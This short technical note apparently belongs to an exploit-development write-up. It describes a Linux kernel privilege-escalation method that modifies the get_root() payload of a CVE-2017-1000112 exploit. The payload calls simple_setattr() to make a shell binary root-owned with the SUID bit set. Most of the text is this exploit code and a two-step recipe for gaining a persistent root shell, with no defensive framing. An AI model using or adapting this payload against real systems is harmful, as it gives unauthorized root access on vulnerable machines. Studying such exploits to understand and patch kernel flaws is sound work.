simple_setattr
==============

The idea of using `simple_setattr()` function is the following:
1) Create a shell binary
2) Exploit the vulnerability and change shell's file properties so it will be owned by root:root with SUID bit set

Here is the modified `get_root()` function of the original CVE-2017-1000112 exploit:

~~~
void get_root(void) {
        struct path path = { 0 };
        struct iattr attr = { .ia_uid = 0, .ia_gid = 0, .ia_mode = 0104755, .ia_valid = ATTR_FORCE | ATTR_UID | ATTR_GID | ATTR_MODE };
        if (!user_path_at_empty(AT_FDCWD, SHELL, 0, &path, NULL)) {
                simple_setattr(path.dentry, &attr);
                path_put(&path);
        }
}
~~~
